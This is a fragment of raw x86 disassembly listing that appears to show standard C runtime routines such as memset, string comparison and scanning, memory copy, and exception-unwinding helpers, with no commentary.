  427c0d:	push   DWORD PTR [ebp+0xc]
  427c10:	push   DWORD PTR [ebp+0x8]
  427c13:	push   ebx
  427c14:	call   DWORD PTR ds:0x4290f8
  427c1a:	mov    edi,eax
  427c1c:	test   esi,esi
  427c1e:	je     0x427c27
  427c20:	push   esi
  427c21:	call   0x425f5a
  427c26:	pop    ecx
  427c27:	mov    eax,edi
  427c29:	lea    esp,[ebp-0x38]
  427c2c:	call   0x42538b
  427c31:	ret    
  427c32:	mov    eax,ds:0x45ddc4
  427c37:	test   eax,eax
  427c39:	je     0x427c4a
  427c3b:	push   DWORD PTR [esp+0x4]
  427c3f:	call   eax
  427c41:	test   eax,eax
  427c43:	pop    ecx
  427c44:	je     0x427c4a
  427c46:	xor    eax,eax
  427c48:	inc    eax
  427c49:	ret    
  427c4a:	xor    eax,eax
  427c4c:	ret    
  427c4d:	int3   
  427c4e:	int3   
  427c4f:	int3   
  427c50:	mov    edx,DWORD PTR [esp+0xc]
  427c54:	mov    ecx,DWORD PTR [esp+0x4]
  427c58:	test   edx,edx
  427c5a:	je     0x427cab
  427c5c:	xor    eax,eax
  427c5e:	mov    al,BYTE PTR [esp+0x8]
  427c62:	push   edi
  427c63:	mov    edi,ecx
  427c65:	cmp    edx,0x4
  427c68:	jb     0x427c9b
  427c6a:	neg    ecx
  427c6c:	and    ecx,0x3
  427c6f:	je     0x427c7d
  427c71:	sub    edx,ecx
  427c73:	mov    BYTE PTR [edi],al
  427c75:	add    edi,0x1
  427c78:	sub    ecx,0x1
  427c7b:	jne    0x427c73
  427c7d:	mov    ecx,eax
  427c7f:	shl    eax,0x8
  427c82:	add    eax,ecx
  427c84:	mov    ecx,eax
  427c86:	shl    eax,0x10
  427c89:	add    eax,ecx
  427c8b:	mov    ecx,edx
  427c8d:	and    edx,0x3
  427c90:	shr    ecx,0x2
  427c93:	je     0x427c9b
  427c95:	rep stos DWORD PTR es:[edi],eax
  427c97:	test   edx,edx
  427c99:	je     0x427ca5
  427c9b:	mov    BYTE PTR [edi],al
  427c9d:	add    edi,0x1
  427ca0:	sub    edx,0x1
  427ca3:	jne    0x427c9b
  427ca5:	mov    eax,DWORD PTR [esp+0x8]
  427ca9:	pop    edi
  427caa:	ret    
  427cab:	mov    eax,DWORD PTR [esp+0x4]
  427caf:	ret    
  427cb0:	push   esi
  427cb1:	mov    esi,DWORD PTR [esp+0x8]
  427cb5:	test   esi,esi
  427cb7:	je     0x427e3e
  427cbd:	push   DWORD PTR [esi+0x4]
  427cc0:	call   0x425f5a
  427cc5:	push   DWORD PTR [esi+0x8]
  427cc8:	call   0x425f5a
  427ccd:	push   DWORD PTR [esi+0xc]
  427cd0:	call   0x425f5a
  427cd5:	push   DWORD PTR [esi+0x10]
  427cd8:	call   0x425f5a
  427cdd:	push   DWORD PTR [esi+0x14]
  427ce0:	call   0x425f5a
  427ce5:	push   DWORD PTR [esi+0x18]
  427ce8:	call   0x425f5a
  427ced:	push   DWORD PTR [esi]
  427cef:	call   0x425f5a
  427cf4:	push   DWORD PTR [esi+0x20]
  427cf7:	call   0x425f5a
  427cfc:	push   DWORD PTR [esi+0x24]
  427cff:	call   0x425f5a
  427d04:	push   DWORD PTR [esi+0x28]
  427d07:	call   0x425f5a
  427d0c:	push   DWORD PTR [esi+0x2c]
  427d0f:	call   0x425f5a
  427d14:	push   DWORD PTR [esi+0x30]
  427d17:	call   0x425f5a
  427d1c:	push   DWORD PTR [esi+0x34]
  427d1f:	call   0x425f5a
  427d24:	push   DWORD PTR [esi+0x1c]
  427d27:	call   0x425f5a
  427d2c:	push   DWORD PTR [esi+0x38]
  427d2f:	call   0x425f5a
  427d34:	push   DWORD PTR [esi+0x3c]
  427d37:	call   0x425f5a
  427d3c:	add    esp,0x40
  427d3f:	push   DWORD PTR [esi+0x40]
  427d42:	call   0x425f5a
  427d47:	push   DWORD PTR [esi+0x44]
  427d4a:	call   0x425f5a
  427d4f:	push   DWORD PTR [esi+0x48]
  427d52:	call   0x425f5a
  427d57:	push   DWORD PTR [esi+0x4c]
  427d5a:	call   0x425f5a
  427d5f:	push   DWORD PTR [esi+0x50]
  427d62:	call   0x425f5a
  427d67:	push   DWORD PTR [esi+0x54]
  427d6a:	call   0x425f5a
  427d6f:	push   DWORD PTR [esi+0x58]
  427d72:	call   0x425f5a
  427d77:	push   DWORD PTR [esi+0x5c]
  427d7a:	call   0x425f5a
  427d7f:	push   DWORD PTR [esi+0x60]
  427d82:	call   0x425f5a
  427d87:	push   DWORD PTR [esi+0x64]
  427d8a:	call   0x425f5a
  427d8f:	push   DWORD PTR [esi+0x68]
  427d92:	call   0x425f5a
  427d97:	push   DWORD PTR [esi+0x6c]
  427d9a:	call   0x425f5a
  427d9f:	push   DWORD PTR [esi+0x70]
  427da2:	call   0x425f5a
  427da7:	push   DWORD PTR [esi+0x74]
  427daa:	call   0x425f5a
  427daf:	push   DWORD PTR [esi+0x78]
  427db2:	call   0x425f5a
  427db7:	push   DWORD PTR [esi+0x7c]
  427dba:	call   0x425f5a
  427dbf:	add    esp,0x40
  427dc2:	push   DWORD PTR [esi+0x80]
  427dc8:	call   0x425f5a
  427dcd:	push   DWORD PTR [esi+0x84]
  427dd3:	call   0x425f5a
  427dd8:	push   DWORD PTR [esi+0x88]
  427dde:	call   0x425f5a
  427de3:	push   DWORD PTR [esi+0x8c]
  427de9:	call   0x425f5a
  427dee:	push   DWORD PTR [esi+0x90]
  427df4:	call   0x425f5a
  427df9:	push   DWORD PTR [esi+0x94]
  427dff:	call   0x425f5a
  427e04:	push   DWORD PTR [esi+0x98]
  427e0a:	call   0x425f5a
  427e0f:	push   DWORD PTR [esi+0x9c]
  427e15:	call   0x425f5a
  427e1a:	push   DWORD PTR [esi+0xa0]
  427e20:	call   0x425f5a
  427e25:	push   DWORD PTR [esi+0xa4]
  427e2b:	call   0x425f5a
  427e30:	push   DWORD PTR [esi+0xa8]
  427e36:	call   0x425f5a
  427e3b:	add    esp,0x2c
  427e3e:	pop    esi
  427e3f:	ret    
  427e40:	push   esi
  427e41:	mov    esi,DWORD PTR [esp+0x8]
  427e45:	test   esi,esi
  427e47:	je     0x427e9d
  427e49:	mov    eax,DWORD PTR [esi]
  427e4b:	mov    ecx,DWORD PTR ds:0x45d934
  427e51:	cmp    eax,DWORD PTR [ecx]
  427e53:	je     0x427e64
  427e55:	cmp    eax,DWORD PTR ds:0x45d904
  427e5b:	je     0x427e64
  427e5d:	push   eax
  427e5e:	call   0x425f5a
  427e63:	pop    ecx
  427e64:	mov    eax,DWORD PTR [esi+0x4]
  427e67:	mov    ecx,DWORD PTR ds:0x45d934
  427e6d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e70:	je     0x427e81
  427e72:	cmp    eax,DWORD PTR ds:0x45d908
  427e78:	je     0x427e81
  427e7a:	push   eax
  427e7b:	call   0x425f5a
  427e80:	pop    ecx
  427e81:	mov    esi,DWORD PTR [esi+0x8]
  427e84:	mov    eax,ds:0x45d934
  427e89:	cmp    esi,DWORD PTR [eax+0x8]
  427e8c:	je     0x427e9d
  427e8e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e94:	je     0x427e9d
  427e96:	push   esi
  427e97:	call   0x425f5a
  427e9c:	pop    ecx
  427e9d:	pop    esi
  427e9e:	ret    
  427e9f:	push   esi
  427ea0:	mov    esi,DWORD PTR [esp+0x8]
  427ea4:	test   esi,esi
  427ea6:	je     0x427f76
  427eac:	mov    eax,DWORD PTR [esi+0xc]
  427eaf:	mov    ecx,DWORD PTR ds:0x45d934
  427eb5:	cmp    eax,DWORD PTR [ecx+0xc]
  427eb8:	je     0x427ec9
  427eba:	cmp    eax,DWORD PTR ds:0x45d910
  427ec0:	je     0x427ec9
  427ec2:	push   eax
  427ec3:	call   0x425f5a
  427ec8:	pop    ecx
  427ec9:	mov    eax,DWORD PTR [esi+0x10]
  427ecc:	mov    ecx,DWORD PTR ds:0x45d934
  427ed2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ed5:	je     0x427ee6
  427ed7:	cmp    eax,DWORD PTR ds:0x45d914
  427edd:	je     0x427ee6
  427edf:	push   eax
  427ee0:	call   0x425f5a
  427ee5:	pop    ecx
  427ee6:	mov    eax,DWORD PTR [esi+0x14]
  427ee9:	mov    ecx,DWORD PTR ds:0x45d934
  427eef:	cmp    eax,DWORD PTR [ecx+0x14]
  427ef2:	je     0x427f03
  427ef4:	cmp    eax,DWORD PTR ds:0x45d918
  427efa:	je     0x427f03
  427efc:	push   eax
  427efd:	call   0x425f5a
  427f02:	pop    ecx
  427f03:	mov    eax,DWORD PTR [esi+0x18]
  427f06:	mov    ecx,DWORD PTR ds:0x45d934
  427f0c:	cmp    eax,DWORD PTR [ecx+0x18]
  427f0f:	je     0x427f20
  427f11:	cmp    eax,DWORD PTR ds:0x45d91c
  427f17:	je     0x427f20
  427f19:	push   eax
  427f1a:	call   0x425f5a
  427f1f:	pop    ecx
  427f20:	mov    eax,DWORD PTR [esi+0x1c]
  427f23:	mov    ecx,DWORD PTR ds:0x45d934
  427f29:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f2c:	je     0x427f3d
  427f2e:	cmp    eax,DWORD PTR ds:0x45d920
  427f34:	je     0x427f3d
  427f36:	push   eax
  427f37:	call   0x425f5a
  427f3c:	pop    ecx
  427f3d:	mov    eax,DWORD PTR [esi+0x20]
  427f40:	mov    ecx,DWORD PTR ds:0x45d934
  427f46:	cmp    eax,DWORD PTR [ecx+0x20]
  427f49:	je     0x427f5a
  427f4b:	cmp    eax,DWORD PTR ds:0x45d924
  427f51:	je     0x427f5a
  427f53:	push   eax
  427f54:	call   0x425f5a
  427f59:	pop    ecx
  427f5a:	mov    esi,DWORD PTR [esi+0x24]
  427f5d:	mov    eax,ds:0x45d934
  427f62:	cmp    esi,DWORD PTR [eax+0x24]
  427f65:	je     0x427f76
  427f67:	cmp    esi,DWORD PTR ds:0x45d928
  427f6d:	je     0x427f76
  427f6f:	push   esi
  427f70:	call   0x425f5a
  427f75:	pop    ecx
  427f76:	pop    esi
  427f77:	ret    
  427f78:	int3   
  427f79:	int3   
  427f7a:	int3   
  427f7b:	int3   
  427f7c:	int3   
  427f7d:	int3   
  427f7e:	int3   
  427f7f:	int3   
  427f80:	push   ebp
  427f81:	mov    ebp,esp
  427f83:	push   esi
  427f84:	xor    eax,eax
  427f86:	push   eax
  427f87:	push   eax
  427f88:	push   eax
  427f89:	push   eax
  427f8a:	push   eax
  427f8b:	push   eax
  427f8c:	push   eax
  427f8d:	push   eax
  427f8e:	mov    edx,DWORD PTR [ebp+0xc]
  427f91:	lea    ecx,[ecx+0x0]
  427f94:	mov    al,BYTE PTR [edx]
  427f96:	or     al,al
  427f98:	je     0x427fa3
  427f9a:	add    edx,0x1
  427f9d:	bts    DWORD PTR [esp],eax
  427fa1:	jmp    0x427f94
  427fa3:	mov    esi,DWORD PTR [ebp+0x8]
  427fa6:	or     ecx,0xffffffff
  427fa9:	lea    ecx,[ecx+0x0]
  427fac:	add    ecx,0x1
  427faf:	mov    al,BYTE PTR [esi]
  427fb1:	or     al,al
  427fb3:	je     0x427fbe
  427fb5:	add    esi,0x1
  427fb8:	bt     DWORD PTR [esp],eax
  427fbc:	jae    0x427fac
  427fbe:	mov    eax,ecx
  427fc0:	add    esp,0x20
  427fc3:	pop    esi
  427fc4:	leave  
  427fc5:	ret    
  427fc6:	int3   
  427fc7:	int3   
  427fc8:	int3   
  427fc9:	int3   
  427fca:	int3   
  427fcb:	int3   
  427fcc:	int3   
  427fcd:	int3   
  427fce:	int3   
  427fcf:	int3   
  427fd0:	mov    edx,DWORD PTR [esp+0x4]
  427fd4:	mov    ecx,DWORD PTR [esp+0x8]
  427fd8:	test   edx,0x3
  427fde:	jne    0x42801c
  427fe0:	mov    eax,DWORD PTR [edx]
  427fe2:	cmp    al,BYTE PTR [ecx]
  427fe4:	jne    0x428014
  427fe6:	or     al,al
  427fe8:	je     0x428010
  427fea:	cmp    ah,BYTE PTR [ecx+0x1]
  427fed:	jne    0x428014
  427fef:	or     ah,ah
  427ff1:	je     0x428010
  427ff3:	shr    eax,0x10
  427ff6:	cmp    al,BYTE PTR [ecx+0x2]
  427ff9:	jne    0x428014
  427ffb:	or     al,al
  427ffd:	je     0x428010
  427fff:	cmp    ah,BYTE PTR [ecx+0x3]
  428002:	jne    0x428014
  428004:	add    ecx,0x4
  428007:	add    edx,0x4
  42800a:	or     ah,ah
  42800c:	jne    0x427fe0
  42800e:	mov    edi,edi
  428010:	xor    eax,eax
  428012:	ret    
  428013:	nop
  428014:	sbb    eax,eax
  428016:	shl    eax,1
  428018:	add    eax,0x1
  42801b:	ret    
  42801c:	test   edx,0x1
  428022:	je     0x42803c
  428024:	mov    al,BYTE PTR [edx]
  428026:	add    edx,0x1
  428029:	cmp    al,BYTE PTR [ecx]
  42802b:	jne    0x428014
  42802d:	add    ecx,0x1
  428030:	or     al,al
  428032:	je     0x428010
  428034:	test   edx,0x2
  42803a:	je     0x427fe0
  42803c:	mov    ax,WORD PTR [edx]
  42803f:	add    edx,0x2
  428042:	cmp    al,BYTE PTR [ecx]
  428044:	jne    0x428014
  428046:	or     al,al
  428048:	je     0x428010
  42804a:	cmp    ah,BYTE PTR [ecx+0x1]
  42804d:	jne    0x428014
  42804f:	or     ah,ah
  428051:	je     0x428010
  428053:	add    ecx,0x2
  428056:	jmp    0x427fe0
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	mov    eax,DWORD PTR [esp+0xc]
  428064:	test   eax,eax
  428066:	je     0x4280b2
  428068:	mov    edx,DWORD PTR [esp+0x4]
  42806c:	push   esi
  42806d:	push   edi
  42806e:	mov    esi,edx
  428070:	mov    edi,DWORD PTR [esp+0x10]
  428074:	or     edx,edi
  428076:	and    edx,0x3
  428079:	je     0x4280b3
  42807b:	test   eax,0x1
  428080:	je     0x428093
  428082:	mov    cl,BYTE PTR [esi]
  428084:	cmp    cl,BYTE PTR [edi]
  428086:	jne    0x4280e0
  428088:	add    esi,0x1
  42808b:	add    edi,0x1
  42808e:	sub    eax,0x1
  428091:	je     0x4280b0
  428093:	mov    cl,BYTE PTR [esi]
  428095:	mov    dl,BYTE PTR [edi]
  428097:	cmp    cl,dl
  428099:	jne    0x4280e0
  42809b:	mov    cl,BYTE PTR [esi+0x1]
  42809e:	mov    dl,BYTE PTR [edi+0x1]
  4280a1:	cmp    cl,dl
  4280a3:	jne    0x4280e0
  4280a5:	add    edi,0x2
  4280a8:	add    esi,0x2
  4280ab:	sub    eax,0x2
  4280ae:	jne    0x428093
  4280b0:	pop    edi
  4280b1:	pop    esi
  4280b2:	ret    
  4280b3:	mov    ecx,eax
  4280b5:	and    eax,0x3
  4280b8:	shr    ecx,0x2
  4280bb:	je     0x4280e8
  4280bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280bf:	je     0x4280e8
  4280c1:	mov    ecx,DWORD PTR [esi-0x4]
  4280c4:	mov    edx,DWORD PTR [edi-0x4]
  4280c7:	cmp    cl,dl
  4280c9:	jne    0x4280db
  4280cb:	cmp    ch,dh
  4280cd:	jne    0x4280db
  4280cf:	shr    ecx,0x10
  4280d2:	shr    edx,0x10
  4280d5:	cmp    cl,dl
  4280d7:	jne    0x4280db
  4280d9:	cmp    ch,dh
  4280db:	mov    eax,0x0
  4280e0:	sbb    eax,eax
  4280e2:	pop    edi
  4280e3:	sbb    eax,0xffffffff
  4280e6:	pop    esi
  4280e7:	ret    
  4280e8:	test   eax,eax
  4280ea:	je     0x4280b0
  4280ec:	mov    edx,DWORD PTR [esi]
  4280ee:	mov    ecx,DWORD PTR [edi]
  4280f0:	cmp    dl,cl
  4280f2:	jne    0x4280db
  4280f4:	sub    eax,0x1
  4280f7:	je     0x428115
  4280f9:	cmp    dh,ch
  4280fb:	jne    0x4280db
  4280fd:	sub    eax,0x1
  428100:	je     0x428115
  428102:	and    ecx,0xff0000
  428108:	and    edx,0xff0000
  42810e:	cmp    edx,ecx
  428110:	jne    0x4280db
  428112:	sub    eax,0x1
  428115:	pop    edi
  428116:	pop    esi
  428117:	ret    
  428118:	int3   
  428119:	int3   
  42811a:	int3   
  42811b:	int3   
  42811c:	int3   
  42811d:	int3   
  42811e:	int3   
  42811f:	int3   
  428120:	push   ebp
  428121:	mov    ebp,esp
  428123:	push   edi
  428124:	push   esi
  428125:	push   ebx
  428126:	mov    ecx,DWORD PTR [ebp+0x10]
  428129:	jecxz  0x428152
  42812b:	mov    ebx,ecx
  42812d:	mov    edi,DWORD PTR [ebp+0x8]
  428130:	mov    esi,edi
  428132:	xor    eax,eax
  428134:	repnz scas al,BYTE PTR es:[edi]
  428136:	neg    ecx
  428138:	add    ecx,ebx
  42813a:	mov    edi,esi
  42813c:	mov    esi,DWORD PTR [ebp+0xc]
  42813f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428141:	mov    al,BYTE PTR [esi-0x1]
  428144:	xor    ecx,ecx
  428146:	cmp    al,BYTE PTR [edi-0x1]
  428149:	ja     0x428150
  42814b:	je     0x428152
  42814d:	sub    ecx,0x2
  428150:	not    ecx
  428152:	mov    eax,ecx
  428154:	pop    ebx
  428155:	pop    esi
  428156:	pop    edi
  428157:	leave  
  428158:	ret    
  428159:	int3   
  42815a:	int3   
  42815b:	int3   
  42815c:	int3   
  42815d:	int3   
  42815e:	int3   
  42815f:	int3   
  428160:	push   ebp
  428161:	mov    ebp,esp
  428163:	push   esi
  428164:	xor    eax,eax
  428166:	push   eax
  428167:	push   eax
  428168:	push   eax
  428169:	push   eax
  42816a:	push   eax
  42816b:	push   eax
  42816c:	push   eax
  42816d:	push   eax
  42816e:	mov    edx,DWORD PTR [ebp+0xc]
  428171:	lea    ecx,[ecx+0x0]
  428174:	mov    al,BYTE PTR [edx]
  428176:	or     al,al
  428178:	je     0x428183
  42817a:	add    edx,0x1
  42817d:	bts    DWORD PTR [esp],eax
  428181:	jmp    0x428174
  428183:	mov    esi,DWORD PTR [ebp+0x8]
  428186:	mov    edi,edi
  428188:	mov    al,BYTE PTR [esi]
  42818a:	or     al,al
  42818c:	je     0x42819a
  42818e:	add    esi,0x1
  428191:	bt     DWORD PTR [esp],eax
  428195:	jae    0x428188
  428197:	lea    eax,[esi-0x1]
  42819a:	add    esp,0x20
  42819d:	pop    esi
  42819e:	leave  
  42819f:	ret    
  4281a0:	push   ebp
  4281a1:	mov    ebp,esp
  4281a3:	push   ebx
  4281a4:	push   esi
  4281a5:	push   edi
  4281a6:	push   ebp
  4281a7:	push   0x0
  4281a9:	push   0x0
  4281ab:	push   0x4281b8
  4281b0:	push   DWORD PTR [ebp+0x8]
  4281b3:	call   0x428c2e
  4281b8:	pop    ebp
  4281b9:	pop    edi
  4281ba:	pop    esi
  4281bb:	pop    ebx
  4281bc:	mov    esp,ebp
  4281be:	pop    ebp
  4281bf:	ret    
  4281c0:	mov    ecx,DWORD PTR [esp+0x4]
  4281c4:	test   DWORD PTR [ecx+0x4],0x6
  4281cb:	mov    eax,0x1
  4281d0:	je     0x4281e1
  4281d2:	mov    eax,DWORD PTR [esp+0x8]
  4281d6:	mov    edx,DWORD PTR [esp+0x10]
  4281da:	mov    DWORD PTR [edx],eax
  4281dc:	mov    eax,0x3
  4281e1:	ret    
  4281e2:	push   ebx
  4281e3:	push   esi
  4281e4:	push   edi
  4281e5:	mov    eax,DWORD PTR [esp+0x10]
  4281e9:	push   eax
  4281ea:	push   0xfffffffe
  4281ec:	push   0x4281c0
  4281f1:	push   DWORD PTR fs:0x0
  4281f8:	mov    DWORD PTR fs:0x0,esp
  4281ff:	mov    eax,DWORD PTR [esp+0x20]
  428203:	mov    ebx,DWORD PTR [eax+0x8]
  428206:	mov    esi,DWORD PTR [eax+0xc]
  428209:	cmp    esi,0xffffffff
  42820c:	je     0x42823c
  42820e:	cmp    esi,DWORD PTR [esp+0x24]
  428212:	je     0x42823c
  428214:	lea    esi,[esi+esi*2]
  428217:	mov    ecx,DWORD PTR [ebx+esi*4]
  42821a:	mov    DWORD PTR [esp+0x8],ecx
  42821e:	mov    DWORD PTR [eax+0xc],ecx
  428221:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428226:	jne    0x42823a
  428228:	push   0x101
  42822d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428231:	call   0x428276
  428236:	call   DWORD PTR [ebx+esi*4+0x8]
  42823a:	jmp    0x4281ff
  42823c:	pop    DWORD PTR fs:0x0
  428243:	add    esp,0xc
  428246:	pop    edi
  428247:	pop    esi
  428248:	pop    ebx
  428249:	ret    
  42824a:	xor    eax,eax
  42824c:	mov    ecx,DWORD PTR fs:0x0
  428253:	cmp    DWORD PTR [ecx+0x4],0x4281c0
  42825a:	jne    0x42826c
  42825c:	mov    edx,DWORD PTR [ecx+0xc]
  42825f:	mov    edx,DWORD PTR [edx+0xc]
  428262:	cmp    DWORD PTR [ecx+0x8],edx
  428265:	jne    0x42826c
  428267:	mov    eax,0x1
  42826c:	ret    
  42826d:	push   ebx
  42826e:	push   ecx
  42826f:	mov    ebx,0x45d94c
  428274:	jmp    0x428280
  428276:	push   ebx
  428277:	push   ecx
  428278:	mov    ebx,0x45d94c
  42827d:	mov    ecx,DWORD PTR [ebp+0x8]
  428280:	mov    DWORD PTR [ebx+0x8],ecx
  428283:	mov    DWORD PTR [ebx+0x4],eax
  428286:	mov    DWORD PTR [ebx+0xc],ebp
  428289:	pop    ecx
  42828a:	pop    ebx
  42828b:	ret    0x4
  42828e:	int3   
  42828f:	int3   
  428290:	push   ebp
  428291:	mov    ebp,esp
  428293:	push   edi
  428294:	push   esi
  428295:	mov    esi,DWORD PTR [ebp+0xc]
  428298:	mov    ecx,DWORD PTR [ebp+0x10]
  42829b:	mov    edi,DWORD PTR [ebp+0x8]
  42829e:	mov    eax,ecx
  4282a0:	mov    edx,ecx
  4282a2:	add    eax,esi
  4282a4:	cmp    edi,esi
  4282a6:	jbe    0x4282b0
  4282a8:	cmp    edi,eax
  4282aa:	jb     0x42842c
  4282b0:	test   edi,0x3
  4282b6:	jne    0x4282cc
  4282b8:	shr    ecx,0x2
  4282bb:	and    edx,0x3
  4282be:	cmp    ecx,0x8
  4282c1:	jb     0x4282ec
  4282c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282c5:	jmp    DWORD PTR [edx*4+0x4283dc]
  4282cc:	mov    eax,edi
  4282ce:	mov    edx,0x3
  4282d3:	sub    ecx,0x4
  4282d6:	jb     0x4282e4
  4282d8:	and    eax,0x3
  4282db:	add    ecx,eax
  4282dd:	jmp    DWORD PTR [eax*4+0x4282f0]
  4282e4:	jmp    DWORD PTR [ecx*4+0x4283ec]
  4282eb:	nop
  4282ec:	jmp    DWORD PTR [ecx*4+0x428370]
  4282f3:	nop
  4282f4:	add    BYTE PTR [ebx-0x7cd3ffbe],al
  4282fa:	inc    edx
  4282fb:	add    BYTE PTR [eax-0x7d],dl
  4282fe:	inc    edx
  4282ff:	add    BYTE PTR [ebx],ah
  428301:	ror    DWORD PTR [edx-0x75f877fa],1
  428307:	inc    esi
  428308:	add    DWORD PTR [eax+0x468a0147],ecx
  42830e:	add    al,cl
  428310:	jmp    0x28a0b17
  428315:	add    esi,0x3
  428318:	add    edi,0x3
  42831b:	cmp    ecx,0x8
  42831e:	jb     0x4282ec
  428320:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428322:	jmp    DWORD PTR [edx*4+0x4283dc]
  428329:	lea    ecx,[ecx+0x0]
  42832c:	and    edx,ecx
  42832e:	mov    al,BYTE PTR [esi]
  428330:	mov    BYTE PTR [edi],al
  428332:	mov    al,BYTE PTR [esi+0x1]
  428335:	shr    ecx,0x2
  428338:	mov    BYTE PTR [edi+0x1],al
  42833b:	add    esi,0x2
  42833e:	add    edi,0x2
  428341:	cmp    ecx,0x8
  428344:	jb     0x4282ec
  428346:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428348:	jmp    DWORD PTR [edx*4+0x4283dc]
  42834f:	nop
  428350:	and    edx,ecx
  428352:	mov    al,BYTE PTR [esi]
  428354:	mov    BYTE PTR [edi],al
  428356:	add    esi,0x1
  428359:	shr    ecx,0x2
  42835c:	add    edi,0x1
  42835f:	cmp    ecx,0x8
  428362:	jb     0x4282ec
  428364:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428366:	jmp    DWORD PTR [edx*4+0x4283dc]
  42836d:	lea    ecx,[ecx+0x0]
  428370:	rol    DWORD PTR [ebx-0x7c3fffbe],cl
  428376:	inc    edx
  428377:	add    BYTE PTR [eax-0x4fffbd7d],bh
  42837d:	add    DWORD PTR [edx+0x0],0xffffffa8
  428381:	add    DWORD PTR [edx+0x0],0xffffffa0
  428385:	add    DWORD PTR [edx+0x0],0xffffff98
  428389:	add    DWORD PTR [edx+0x0],0xffffff90
  42838d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428391:	inc    esp
  428392:	mov    fs,esp
  428394:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283c8:	lea    eax,[ecx*4+0x0]
  4283cf:	add    esi,eax
  4283d1:	add    edi,eax
  4283d3:	jmp    DWORD PTR [edx*4+0x4283dc]
  4283da:	mov    edi,edi
  4283dc:	in     al,dx
  4283dd:	add    DWORD PTR [edx+0x0],0xfffffff4
  4283e1:	add    DWORD PTR [edx+0x0],0x0
  4283e5:	test   BYTE PTR [edx+0x0],al
  4283e8:	adc    al,0x84
  4283ea:	inc    edx
  4283eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4283f1:	leave  
  4283f2:	ret    
  4283f3:	nop
  4283f4:	mov    al,BYTE PTR [esi]
  4283f6:	mov    BYTE PTR [edi],al
  4283f8:	mov    eax,DWORD PTR [ebp+0x8]
  4283fb:	pop    esi
  4283fc:	pop    edi
  4283fd:	leave  
  4283fe:	ret    
  4283ff:	nop
  428400:	mov    al,BYTE PTR [esi]
  428402:	mov    BYTE PTR [edi],al
  428404:	mov    al,BYTE PTR [esi+0x1]
  428407:	mov    BYTE PTR [edi+0x1],al
  42840a:	mov    eax,DWORD PTR [ebp+0x8]
  42840d:	pop    esi
  42840e:	pop    edi
  42840f:	leave  
  428410:	ret    
  428411:	lea    ecx,[ecx+0x0]
  428414:	mov    al,BYTE PTR [esi]
  428416:	mov    BYTE PTR [edi],al
  428418:	mov    al,BYTE PTR [esi+0x1]
  42841b:	mov    BYTE PTR [edi+0x1],al
  42841e:	mov    al,BYTE PTR [esi+0x2]
  428421:	mov    BYTE PTR [edi+0x2],al
  428424:	mov    eax,DWORD PTR [ebp+0x8]
  428427:	pop    esi
  428428:	pop    edi
  428429:	leave  
  42842a:	ret    
  42842b:	nop
  42842c:	lea    esi,[ecx+esi*1-0x4]
  428430:	lea    edi,[ecx+edi*1-0x4]
  428434:	test   edi,0x3
  42843a:	jne    0x428460
  42843c:	shr    ecx,0x2
  42843f:	and    edx,0x3
  428442:	cmp    ecx,0x8
  428445:	jb     0x428454
  428447:	std    
  428448:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42844a:	cld    
  42844b:	jmp    DWORD PTR [edx*4+0x428578]
  428452:	mov    edi,edi
  428454:	neg    ecx
  428456:	jmp    DWORD PTR [ecx*4+0x428528]
  42845d:	lea    ecx,[ecx+0x0]
  428460:	mov    eax,edi
  428462:	mov    edx,0x3
  428467:	cmp    ecx,0x4
  42846a:	jb     0x428478
  42846c:	and    eax,0x3
  42846f:	sub    ecx,eax
  428471:	jmp    DWORD PTR [eax*4+0x42847c]
  428478:	jmp    DWORD PTR [ecx*4+0x428578]
  42847f:	nop
  428480:	mov    WORD PTR [edx+eax*2+0x4284b000],es
  428487:	add    al,bl
  428489:	test   BYTE PTR [edx+0x0],al
  42848c:	mov    al,BYTE PTR [esi+0x3]
  42848f:	and    edx,ecx
  428491:	mov    BYTE PTR [edi+0x3],al
  428494:	sub    esi,0x1
  428497:	shr    ecx,0x2
  42849a:	sub    edi,0x1
  42849d:	cmp    ecx,0x8
  4284a0:	jb     0x428454
  4284a2:	std    
  4284a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284a5:	cld    
  4284a6:	jmp    DWORD PTR [edx*4+0x428578]
  4284ad:	lea    ecx,[ecx+0x0]
  4284b0:	mov    al,BYTE PTR [esi+0x3]
  4284b3:	and    edx,ecx
  4284b5:	mov    BYTE PTR [edi+0x3],al
  4284b8:	mov    al,BYTE PTR [esi+0x2]
  4284bb:	shr    ecx,0x2
  4284be:	mov    BYTE PTR [edi+0x2],al
  4284c1:	sub    esi,0x2
  4284c4:	sub    edi,0x2
  4284c7:	cmp    ecx,0x8
  4284ca:	jb     0x428454
  4284cc:	std    
  4284cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
